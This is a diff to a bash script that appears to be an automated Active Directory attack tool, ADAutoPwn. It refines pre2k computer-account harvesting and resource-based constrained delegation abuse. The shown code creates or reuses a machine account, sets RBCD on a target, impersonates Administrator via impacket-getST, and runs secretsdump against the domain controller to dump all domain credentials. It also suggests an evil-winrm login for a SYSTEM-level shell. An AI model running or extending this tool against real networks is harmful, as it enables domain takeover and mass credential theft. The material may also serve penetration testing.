@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.7"
+readonly VERSION="1.49.8"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -1360,7 +1360,7 @@ phase_precreated_computers() {
             add_secret "$stem" "pre2k default password (${stem}\$)"
             note_cred_source "${stem}\$" "NetExec pre2k module"
             queue_cred "${stem}\$" "$stem" "" "Pre-created computer (pre2k)"; queued=1
-        done < <(grep -oiP 'obtained TGT for \K[^@[:space:]]+' "$pre" 2>/dev/null | sed 's/\$$//' | sort -u)
+        done < <(grep -oiP 'obtained TGT for \K[^@[:space:]]+(?=@)' "$pre" 2>/dev/null | sed 's/\$$//' | sort -u)
         # Also queue any account pre2k merely LISTED (default password = lowercase name)
         # so it's tried even if the module couldn't mint the TGT (e.g. RC4-disabled DC).
         while IFS= read -r acc; do
@@ -4015,38 +4015,56 @@ _abuse_rbcd() {
     # computer account. Writing the attribute on a user is a dead end, so don't
     # waste a machine-account creation + noisy traceback on it.
     [[ "$target" != *\$ ]] && { info "  RBCD not applicable to user '$target' (computer accounts only)"; return 1; }
-    have impacket-getST && have impacket-addcomputer || return 1
-    abuse_confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
+    have impacket-getST || return 1
     local ba; mapfile -t ba < <(bloody_args)
-    local cpass="ADAutoPwn_RBCD_123!" dch="${DC_FQDN:-$DCT}"
-    run "impacket-addcomputer (adpwn\$) via $USER"
-    # Kerberos addcomputer REQUIRES -dc-host (DNS name), or it errors out.
-    local addout
-    if   [[ -n "$HASH" ]]; then addout=$(impacket-addcomputer "$DOMAIN/$USER" -hashes ":$HASH" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
-    elif [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then addout=$(KRB5CCNAME="$KERB_TICKET" impacket-addcomputer "$DOMAIN/$USER" -k -no-pass -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
-    else addout=$(impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1); fi
-    echo "$addout" | tee -a "$LOGFILE"
-    if ! grep -qiE 'Successfully added|added the machine account' <<<"$addout"; then
-        warn "Could not add machine account (MachineAccountQuota=0 or no rights) → RBCD not possible from $USER"
-        return 1
+    local dch="${DC_FQDN:-$DCT}" cpass="ADAutoPwn_RBCD_123!" deleg=""; local -a delcreds=()
+
+    if [[ "$USER" == *\$ ]]; then
+        # We ALREADY control a computer account (the current identity) → use IT as the
+        # RBCD delegate. No machine-account creation → MachineAccountQuota=0 is moot.
+        # This is the pre-created-computer → GenericWrite-over-host → RBCD pivot.
+        deleg="$USER"
+        if   [[ -n "$HASH" ]];                              then delcreds=(-hashes ":${HASH##*:}" "$DOMAIN/$USER")
+        elif [[ -n "$PASS" ]];                              then delcreds=("$DOMAIN/$USER:$PASS")
+        elif [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then delcreds=(-k -no-pass "$DOMAIN/$USER")
+        else warn "  no usable creds for ${USER} to act as RBCD delegate"; return 1; fi
+        info "  Using controlled computer ${C_BOLD}${USER}${C_RESET} as the RBCD delegate (MAQ=0 doesn't matter)"
+        abuse_confirm "  RBCD on '${target}' via ${USER} → impersonate Administrator?" || return 1
+    else
+        # A user identity → we need a computer we control; try to create one (MAQ>0).
+        have impacket-addcomputer || return 1
+        abuse_confirm "  RBCD on '${target}' (will try to create a machine account)?" || return 1
+        run "impacket-addcomputer (adpwn\$) via $USER"
+        local addout
+        if   [[ -n "$HASH" ]]; then addout=$(impacket-addcomputer "$DOMAIN/$USER" -hashes ":${HASH##*:}" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
+        elif [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then addout=$(KRB5CCNAME="$KERB_TICKET" impacket-addcomputer "$DOMAIN/$USER" -k -no-pass -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
+        else addout=$(impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1); fi
+        echo "$addout" | tee -a "$LOGFILE"
+        if grep -qiE 'Successfully added|added the machine account' <<<"$addout"; then
+            deleg='adpwn$'; delcreds=("$DOMAIN/adpwn\$:$cpass")
+            rb_record "Created machine account adpwn\$" "impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -dc-host '$dch' -computer-name 'adpwn\$' -delete 2>/dev/null"
+        else
+            warn "  MachineAccountQuota=0 / no rights → can't create a computer."
+            info  "  → pivot as a computer you already own (e.g. a pre2k FSxx\$); it'll be used as the RBCD delegate directly."
+            return 1
+        fi
     fi
-    rb_record "Created machine account adpwn\$" "impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -dc-host '$dch' -computer-name 'adpwn\$' -delete 2>/dev/null"
-    run "bloodyAD add rbcd '$target' 'adpwn\$'"
-    bloodyAD "${ba[@]}" add rbcd "$target" 'adpwn$' 2>&1 | tee -a "$LOGFILE"
-    rb_record "Set RBCD on $target → adpwn\$" "bloodyAD ${ba[*]} remove rbcd '$target' 'adpwn\$'"
+
+    run "bloodyAD ${ba[*]} add rbcd '$target' '$deleg'"
+    bloodyAD "${ba[@]}" add rbcd "$target" "$deleg" 2>&1 | tee -a "$LOGFILE"
+    rb_record "Set RBCD on $target → $deleg" "bloodyAD ${ba[*]} remove rbcd '$target' '$deleg'"
     local svc="cifs/${target%\$}.${DOMAIN}"
-    run "impacket-getST -spn $svc -impersonate Administrator $DOMAIN/adpwn\$"
-    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" -dc-host "$dch" 2>&1); echo "$stout" | tee -a "$LOGFILE"
-    # Real success only — getST prints "Saving ticket in <file>". Don't fall for a
-    # stale .ccache lying in CWD (that produced bogus "RBCD succeeded" before).
+    run "impacket-getST -spn $svc -impersonate Administrator <${deleg}>"
+    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "${delcreds[@]}" -dc-ip "$DC_IP" -dc-host "$dch" 2>&1); echo "$stout" | tee -a "$LOGFILE"
     local stfile; stfile=$(grep -oiP 'Saving ticket in \K\S+\.ccache' <<<"$stout" | head -1)
     if [[ -n "$stfile" && -f "$stfile" ]] && ! grep -qiE 'KDC_ERR|SessionError|does not have' <<<"$stout"; then
-        mv -f "$stfile" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
-        loot "★ RBCD → Administrator service ticket for $target → rbcd_admin.ccache"
-        note_cred_source "Administrator@$target" "RBCD impersonation"
+        local cc="$OUTDIR/rbcd_admin_${target%\$}.ccache"; mv -f "$stfile" "$cc" 2>/dev/null
+        loot "★ RBCD → Administrator@${target} service ticket → $(basename "$cc")"
+        note_cred_source "Administrator@$target" "RBCD impersonation via $deleg"
+        loot "  → KRB5CCNAME=$cc evil-winrm -i ${target%\$}.${DOMAIN} -u Administrator   (psexec/wmiexec too; on the host → RpcEptMapper → SYSTEM)"
         if [[ "${target%\$}" == "$DC_HOST" ]]; then
             subsection "RBCD ticket targets the DC → secretsdump"
-            KRB5CCNAME="$OUTDIR/rbcd_admin.ccache" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
+            KRB5CCNAME="$cc" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
                 -outputfile "$OUTDIR/dcsync_rbcd" 2>&1 | tee -a "$LOGFILE" | tee -a "$OUTDIR/secretsdump.txt"
         fi
         return 0
